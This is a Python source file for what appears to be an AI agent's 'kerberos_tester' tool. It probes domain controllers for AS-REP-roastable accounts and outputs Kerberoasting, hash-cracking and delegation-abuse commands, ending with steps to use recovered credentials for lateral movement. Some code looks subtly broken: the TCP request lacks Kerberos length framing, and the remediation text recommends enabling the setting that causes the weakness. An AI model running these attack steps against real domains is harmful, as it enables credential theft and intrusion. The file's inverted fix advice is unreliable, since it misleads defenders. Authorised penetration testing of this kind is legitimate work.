"""Kerberos security testing for AS-REP roasting, Kerberoasting, and delegation abuse."""

from __future__ import annotations

import socket
import struct
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Literal

from strix.tools.registry import register_tool
from strix.tools.validation import (
    generate_usage_hint,
    validate_action_param,
    validate_required_param,
    validate_unknown_params,
)


KerberosAction = Literal[
    "test_asrep",
    "test_kerberoast",
    "enumerate_spns",
    "check_delegation",
    "check_preauth",
    "full_test",
]

# Kerberos constants
KRB5_PORT = 88
AS_REQ = 10
AS_REP = 11
TGS_REQ = 12
TGS_REP = 13
KRB_ERROR = 30

# Error codes
KDC_ERR_PREAUTH_REQUIRED = 25
KDC_ERR_C_PRINCIPAL_UNKNOWN = 6
KDC_ERR_CLIENT_REVOKED = 18

# Encryption types
ETYPE_AES256_CTS_HMAC_SHA1_96 = 18
ETYPE_AES128_CTS_HMAC_SHA1_96 = 17
ETYPE_RC4_HMAC = 23
ETYPE_DES_CBC_MD5 = 3


def _encode_length(length: int) -> bytes:
    """Encode ASN.1 length."""
    if length < 128:
        return struct.pack("B", length)
    elif length < 256:
        return struct.pack("BB", 0x81, length)
    else:
        return struct.pack(">BH", 0x82, length)


def _encode_int(value: int, tag: int = 0x02) -> bytes:
    """Encode ASN.1 integer."""
    if value == 0:
        return struct.pack("BBB", tag, 1, 0)
    elif value < 128:
        return struct.pack("BBB", tag, 1, value)
    elif value < 32768:
        return struct.pack(">BBH", tag, 2, value)
    else:
        return struct.pack(">BBI", tag, 4, value)


def _encode_string(value: str, tag: int = 0x1b) -> bytes:
    """Encode ASN.1 string."""
    encoded = value.encode("utf-8")
    return struct.pack("B", tag) + _encode_length(len(encoded)) + encoded


def _encode_sequence(data: bytes, tag: int = 0x30) -> bytes:
    """Encode ASN.1 sequence."""
    return struct.pack("B", tag) + _encode_length(len(data)) + data


def _encode_context(data: bytes, tag_num: int) -> bytes:
    """Encode ASN.1 context-specific tag."""
    tag = 0xa0 | tag_num
    return struct.pack("B", tag) + _encode_length(len(data)) + data


def _create_as_req(username: str, domain: str, no_preauth: bool = True) -> bytes:
    """Create Kerberos AS-REQ message."""
    # Principal name (client)
    name_string = _encode_string(username, 0x1b)
    name_seq = _encode_sequence(name_string)
    cname_type = _encode_int(1)  # NT-PRINCIPAL
    cname = _encode_sequence(
        _encode_context(cname_type, 0) +
        _encode_context(name_seq, 1)
    )

    # Realm
    realm = _encode_string(domain.upper(), 0x1b)

    # Server name (krbtgt/REALM)
    sname_string1 = _encode_string("krbtgt", 0x1b)
    sname_string2 = _encode_string(domain.upper(), 0x1b)
    sname_seq = _encode_sequence(sname_string1 + sname_string2)
    sname_type = _encode_int(2)  # NT-SRV-INST
    sname = _encode_sequence(
        _encode_context(sname_type, 0) +
        _encode_context(sname_seq, 1)
    )

    # Till time (far future)
    till = _encode_string("20370913024805Z", 0x18)

    # Nonce
    nonce = _encode_int(12345678)

    # Encryption types
    etypes = _encode_sequence(
        _encode_int(ETYPE_RC4_HMAC) +  # RC4 for AS-REP roasting
        _encode_int(ETYPE_AES256_CTS_HMAC_SHA1_96) +
        _encode_int(ETYPE_AES128_CTS_HMAC_SHA1_96)
    )

    # KDC options (no preauth if testing AS-REP roasting)
    kdc_options = struct.pack(">I", 0x40810010)  # forwardable, renewable, canonicalize

    # Req body
    req_body = _encode_sequence(
        _encode_context(struct.pack("BB", 0x03, 5) + kdc_options, 0) +
        _encode_context(cname, 1) +
        _encode_context(realm, 2) +
        _encode_context(sname, 3) +
        _encode_context(till, 5) +
        _encode_context(nonce, 7) +
        _encode_context(etypes, 8)
    )

    # AS-REQ
    pvno = _encode_int(5)
    msg_type = _encode_int(AS_REQ)

    as_req = _encode_sequence(
        _encode_context(pvno, 1) +
        _encode_context(msg_type, 2) +
        _encode_context(req_body, 4),
        0x6a  # AS-REQ application tag
    )

    return as_req


def _parse_krb_response(data: bytes) -> dict[str, Any]:
    """Parse Kerberos response."""
    result = {
        "type": "unknown",
        "success": False,
    }

    if not data or len(data) < 2:
        return result

    # Check application tag
    tag = data[0]

    if tag == 0x6b:  # AS-REP
        result["type"] = "AS-REP"
        result["success"] = True
        result["as_rep_roastable"] = True
        # Try to extract encrypted part for cracking
        result["note"] = "Account is AS-REP roastable (preauth not required)"

    elif tag == 0x7e:  # KRB-ERROR
        result["type"] = "KRB-ERROR"

        # Try to parse error code
        try:
            # Skip to error code (simplified parsing)
            idx = 2
            while idx < len(data) - 2:
                if data[idx] == 0xa6:  # error-code context tag
                    idx += 1
                    length = data[idx]
                    idx += 1
                    if data[idx] == 0x02:  # integer
                        idx += 1
                        int_len = data[idx]
                        idx += 1
                        error_code = int.from_bytes(data[idx:idx + int_len], "big")
                        result["error_code"] = error_code

                        if error_code == KDC_ERR_PREAUTH_REQUIRED:
                            result["preauth_required"] = True
                            result["note"] = "Preauth required - not AS-REP roastable"
                        elif error_code == KDC_ERR_C_PRINCIPAL_UNKNOWN:
                            result["principal_unknown"] = True
                            result["note"] = "Principal not found"
                        elif error_code == KDC_ERR_CLIENT_REVOKED:
                            result["account_disabled"] = True
                            result["note"] = "Account disabled or locked"

                        break
                idx += 1
        except Exception:
            pass

    return result


def _test_asrep(
    target: str,
    domain: str,
    users: list[str] | None = None,
    users_file: str | None = None,
    timeout: float = 10.0,
) -> dict[str, Any]:
    """Test for AS-REP roastable accounts."""
    result = {
        "action": "test_asrep",
        "target": target,
        "domain": domain,
        "vulnerable_accounts": [],
        "tested_accounts": [],
    }

    # Get user list
    test_users = []
    if users:
        test_users = users
    elif users_file:
        try:
            with open(users_file) as f:
                test_users = [line.strip() for line in f if line.strip()]
        except OSError as e:
            result["error"] = f"Could not read users file: {e}"
            return result
    else:
        # Default common usernames to test
        test_users = [
            "administrator", "admin", "guest", "krbtgt",
            "svc_", "service", "backup", "sql", "web",
        ]

    for username in test_users[:50]:  # Limit to 50 users
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((target, KRB5_PORT))

            # Send AS-REQ without preauth
            as_req = _create_as_req(username, domain, no_preauth=True)
            sock.send(as_req)

            response = sock.recv(4096)
            sock.close()

            if response:
                parsed = _parse_krb_response(response)
                test_result = {
                    "username": username,
                    "response_type": parsed.get("type"),
                }

                if parsed.get("as_rep_roastable"):
                    test_result["vulnerable"] = True
                    test_result["attack"] = "AS-REP Roasting"
                    result["vulnerable_accounts"].append(username)
                elif parsed.get("preauth_required"):
                    test_result["vulnerable"] = False
                    test_result["note"] = "Preauth required"
                elif parsed.get("principal_unknown"):
                    test_result["exists"] = False

                result["tested_accounts"].append(test_result)

        except socket.timeout:
            result["tested_accounts"].append({"username": username, "error": "timeout"})
        except ConnectionRefusedError:
            result["error"] = "KDC connection refused"
            break
        except Exception as e:
            result["tested_accounts"].append({"username": username, "error": str(e)})

    # Summary
    result["vulnerable_count"] = len(result["vulnerable_accounts"])

    if result["vulnerable_accounts"]:
        result["severity"] = "high"
        result["attack_commands"] = {
            "impacket": f"GetNPUsers.py {domain}/ -dc-ip {target} -usersfile users.txt -format hashcat",
            "rubeus": f"Rubeus.exe asreproast /domain:{domain} /dc:{target}",
            "kerbrute": f"kerbrute userenum -d {domain} --dc {target} users.txt",
        }
        result["next_steps"] = [
            "Extract AS-REP hash using GetNPUsers.py or Rubeus",
            "Crack hash with hashcat mode 18200",
            "Use recovered credentials for further access",
        ]

    return result


def _test_kerberoast(
    target: str,
    domain: str,
    username: str | None = None,
    password: str | None = None,
) -> dict[str, Any]:
    """Test for Kerberoastable service accounts."""
    result = {
        "action": "test_kerberoast",
        "target": target,
        "domain": domain,
    }

    result["note"] = "Kerberoasting requires valid domain credentials"

    if username and password:
        result["suggested_commands"] = [
            f"GetUserSPNs.py {domain}/{username}:{password} -dc-ip {target} -request",
            f"impacket-GetUserSPNs -dc-ip {target} -request {domain}/{username}:{password}",
            f"Rubeus.exe kerberoast /domain:{domain} /dc:{target} /creduser:{domain}\\{username} /credpassword:{password}",
        ]
        result["authenticated"] = True
    else:
        result["suggested_commands"] = [
            f"GetUserSPNs.py {domain}/ -dc-ip {target} -no-pass (requires valid creds)",
            "Rubeus.exe kerberoast (from domain-joined machine)",
        ]
        result["authenticated"] = False

    result["attack_info"] = {
        "description": "Kerberoasting extracts TGS tickets for service accounts that can be cracked offline",
        "target_accounts": "Accounts with servicePrincipalName (SPN) attribute set",
        "cracking": {
            "hashcat_mode": 13100,
            "example": "hashcat -m 13100 tickets.txt wordlist.txt",
        },
    }

    result["ldap_filter"] = "(&(objectCategory=person)(servicePrincipalName=*))"

    return result


def _enumerate_spns(
    target: str,
    domain: str,
    username: str | None = None,
    password: str | None = None,
) -> dict[str, Any]:
    """Enumerate Service Principal Names."""
    result = {
        "action": "enumerate_spns",
        "target": target,
        "domain": domain,
    }

    base_dn = ",".join([f"DC={part}" for part in domain.split(".")])

    if username and password:
        result["suggested_commands"] = [
            f"GetUserSPNs.py {domain}/{username}:{password} -dc-ip {target}",
            f"ldapsearch -x -H ldap://{target} -D '{username}@{domain}' -w '{password}' -b '{base_dn}' '(&(objectCategory=person)(servicePrincipalName=*))' sAMAccountName servicePrincipalName",
        ]
    else:
        result["suggested_commands"] = [
            f"ldapsearch -x -H ldap://{target} -b '{base_dn}' '(servicePrincipalName=*)' sAMAccountName servicePrincipalName",
        ]

    result["common_spn_types"] = {
        "MSSQL": "MSSQLSvc/hostname:port",
        "HTTP": "HTTP/hostname",
        "Exchange": "exchangeMDB/hostname",
        "LDAP": "ldap/hostname",
        "Host": "HOST/hostname",
        "RestrictedKrbHost": "RestrictedKrbHost/hostname",
    }

    result["high_value_targets"] = [
        "SQL service accounts",
        "Web service accounts",
        "Exchange service accounts",
        "Accounts with adminCount=1",
    ]

    return result


def _check_delegation(
    target: str,
    domain: str,
    username: str | None = None,
    password: str | None = None,
) -> dict[str, Any]:
    """Check for delegation misconfigurations."""
    result = {
        "action": "check_delegation",
        "target": target,
        "domain": domain,
    }

    base_dn = ",".join([f"DC={part}" for part in domain.split(".")])

    result["delegation_types"] = {
        "unconstrained": {
            "description": "Account can impersonate any user to any service",
            "severity": "critical",
            "ldap_filter": "(userAccountControl:1.2.840.113556.1.4.803:=524288)",
            "attack": "Capture TGTs from users authenticating to this host",
        },
        "constrained": {
            "description": "Account can impersonate users to specific services",
            "severity": "high",
            "ldap_filter": "(msDS-AllowedToDelegateTo=*)",
            "attack": "S4U2Self/S4U2Proxy to access allowed services",
        },
        "rbcd": {
            "description": "Resource-based constrained delegation",
            "severity": "high",
            "ldap_filter": "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)",
            "attack": "Configure RBCD if you control a computer account",
        },
    }

    if username and password:
        result["suggested_commands"] = [
            f"findDelegation.py {domain}/{username}:{password} -dc-ip {target}",
            f"Get-DomainComputer -Unconstrained | select samaccountname",
            f"ldapsearch -x -H ldap://{target} -D '{username}@{domain}' -w '{password}' -b '{base_dn}' '(userAccountControl:1.2.840.113556.1.4.803:=524288)' sAMAccountName",
        ]
    else:
        result["suggested_commands"] = [
            "findDelegation.py domain/user:pass -dc-ip <DC_IP>",
            "Get-DomainComputer -Unconstrained (from domain-joined machine)",
        ]

    result["exploitation"] = {
        "unconstrained": [
            "Coerce authentication from DC (PrinterBug, PetitPotam)",
            "Capture TGT using Rubeus monitor",
            "Use TGT to access resources as captured user",
        ],
        "constrained": [
            "Use S4U2Self to get forwardable ticket",
            "Use S4U2Proxy to access allowed services",
            "Tools: getST.py, Rubeus s4u",
        ],
    }

    return result


def _check_preauth(
    target: str,
    domain: str,
    username: str,
    timeout: float = 10.0,
) -> dict[str, Any]:
    """Test if Kerberos preauth is required for a specific user."""
    result = {
        "action": "check_preauth",
        "target": target,
        "domain": domain,
        "username": username,
    }

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((target, KRB5_PORT))

        as_req = _create_as_req(username, domain, no_preauth=True)
        sock.send(as_req)

        response = sock.recv(4096)
        sock.close()

        if response:
            parsed = _parse_krb_response(response)

            if parsed.get("as_rep_roastable"):
                result["preauth_required"] = False
                result["as_rep_roastable"] = True
                result["severity"] = "high"
                result["finding"] = f"Account {username} does not require Kerberos preauth"
                result["recommendation"] = "Enable 'Do not require Kerberos preauthentication' in AD"
            elif parsed.get("preauth_required"):
                result["preauth_required"] = True
                result["as_rep_roastable"] = False
                result["note"] = "Account requires preauth (secure configuration)"
            elif parsed.get("principal_unknown"):
                result["account_exists"] = False
                result["note"] = "Account not found"
            elif parsed.get("account_disabled"):
                result["account_disabled"] = True
                result["note"] = "Account is disabled"
            else:
                result["response_type"] = parsed.get("type")
                result["error_code"] = parsed.get("error_code")

    except socket.timeout:
        result["error"] = "Connection timed out"
    except ConnectionRefusedError:
        result["error"] = "KDC connection refused"
    except Exception as e:
        result["error"] = str(e)

    return result


def _full_test(
    target: str,
    domain: str,
    username: str | None = None,
    password: str | None = None,
    users_file: str | None = None,
) -> dict[str, Any]:
    """Run comprehensive Kerberos security tests."""
    result = {
        "action": "full_test",
        "target": target,
        "domain": domain,
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }

    # Test AS-REP roasting
    result["asrep_test"] = _test_asrep(target, domain, users_file=users_file)

    # Kerberoast info
    result["kerberoast_test"] = _test_kerberoast(target, domain, username, password)

    # SPN enumeration
    result["spn_enumeration"] = _enumerate_spns(target, domain, username, password)

    # Delegation check
    result["delegation_check"] = _check_delegation(target, domain, username, password)

    # Summary
    findings = []

    if result["asrep_test"].get("vulnerable_accounts"):
        findings.append({
            "type": "AS-REP Roasting",
            "severity": "high",
            "accounts": result["asrep_test"]["vulnerable_accounts"],
            "description": "Accounts without Kerberos preauth can be roasted",
        })

    result["summary"] = {
        "total_findings": len(findings),
        "findings": findings,
        "attack_paths": [],
    }

    if findings:
        result["summary"]["attack_paths"] = [
            "AS-REP Roast → Crack hash → Use credentials",
            "Kerberoast → Crack TGS → Access services",
            "Delegation abuse → Impersonate users → Lateral movement",
        ]

    # Comprehensive tool commands
    result["tool_commands"] = {
        "impacket": {
            "asrep": f"GetNPUsers.py {domain}/ -dc-ip {target} -usersfile users.txt -format hashcat",
            "kerberoast": f"GetUserSPNs.py {domain}/{username or 'user'}:{password or 'pass'} -dc-ip {target} -request" if username else "Requires credentials",
            "delegation": f"findDelegation.py {domain}/{username or 'user'}:{password or 'pass'} -dc-ip {target}" if username else "Requires credentials",
        },
        "rubeus": {
            "asrep": "Rubeus.exe asreproast /format:hashcat",
            "kerberoast": "Rubeus.exe kerberoast /format:hashcat",
            "monitor": "Rubeus.exe monitor /interval:5",
        },
        "cracking": {
            "asrep": "hashcat -m 18200 asrep.txt wordlist.txt",
            "kerberoast": "hashcat -m 13100 tgs.txt wordlist.txt",
        },
    }

    return result


@register_tool
def kerberos_tester(
    action: KerberosAction,
    target: str | None = None,
    username: str | None = None,
    password: str | None = None,
    domain: str | None = None,
    users_file: str | None = None,
    **kwargs: Any,
) -> dict[str, Any] | str:
    """Test Kerberos security for AS-REP roasting, Kerberoasting, and delegation abuse.

    Args:
        action: The testing action to perform:
            - test_asrep: Test for AS-REP roastable accounts
            - test_kerberoast: Test for Kerberoastable accounts
            - enumerate_spns: Enumerate service principal names
            - check_delegation: Check for delegation misconfigurations
            - check_preauth: Test if preauth is required
            - full_test: Run all Kerberos security tests
        target: Target domain controller or domain name
        username: Username for authenticated tests
        password: Password for authentication
        domain: Domain name (e.g., domain.local)
        users_file: File with usernames to test (one per line)

    Returns:
        Test results with vulnerable accounts and attack vectors
    """
    VALID_PARAMS = {"action", "target", "username", "password", "domain", "users_file"}
    VALID_ACTIONS = ["test_asrep", "test_kerberoast", "enumerate_spns", "check_delegation", "check_preauth", "full_test"]

    if unknown_error := validate_unknown_params(kwargs, VALID_PARAMS, "kerberos_tester"):
        unknown_error.update(
            generate_usage_hint("kerberos_tester", "test_asrep", {"target": "dc01.domain.local", "domain": "domain.local"})
        )
        return unknown_error

    if action_error := validate_action_param(action, VALID_ACTIONS, "kerberos_tester"):
        action_error["usage_examples"] = {
            "test_asrep": 'kerberos_tester(action="test_asrep", target="dc01.domain.local", domain="domain.local")',
            "test_kerberoast": 'kerberos_tester(action="test_kerberoast", target="10.0.0.1", username="user@domain.local", password="pass")',
            "full_test": 'kerberos_tester(action="full_test", target="dc01.domain.local", domain="domain.local")',
        }
        return action_error

    if param_error := validate_required_param(target, "target", action, "kerberos_tester"):
        param_error.update(generate_usage_hint("kerberos_tester", action, {"target": "dc01.domain.local"}))
        return param_error

    # Domain is required for most actions
    if action != "check_preauth" and not domain:
        # Try to extract domain from target if it looks like FQDN
        if "." in target and not target.replace(".", "").isdigit():
            parts = target.split(".")
            if len(parts) >= 2:
                domain = ".".join(parts[-2:])

    if not domain and action in ["test_asrep", "test_kerberoast", "enumerate_spns", "check_delegation", "full_test"]:
        return {
            "error": "domain parameter required",
            "hint": "Provide domain name like 'domain.local'",
            "tool_name": "kerberos_tester",
        }

    try:
        if action == "test_asrep":
            return _test_asrep(target, domain, users_file=users_file)
        elif action == "test_kerberoast":
            return _test_kerberoast(target, domain, username, password)
        elif action == "enumerate_spns":
            return _enumerate_spns(target, domain, username, password)
        elif action == "check_delegation":
            return _check_delegation(target, domain, username, password)
        elif action == "check_preauth":
            if not username:
                return {
                    "error": "username parameter required for check_preauth",
                    "hint": "Provide username to test",
                    "tool_name": "kerberos_tester",
                }
            if not domain:
                return {
                    "error": "domain parameter required for check_preauth",
                    "hint": "Provide domain name like 'domain.local'",
                    "tool_name": "kerberos_tester",
                }
            return _check_preauth(target, domain, username)
        elif action == "full_test":
            return _full_test(target, domain, username, password, users_file)

    except socket.gaierror:
        return {
            "error": f"Could not resolve hostname: {target}",
            "hint": "Verify the target hostname or use an IP address",
            "tool_name": "kerberos_tester",
        }
    except Exception as e:
        return {
            "error": f"Kerberos test failed: {e!s}",
            "tool_name": "kerberos_tester",
        }

    return {"error": "Unknown action", "tool_name": "kerberos_tester"}
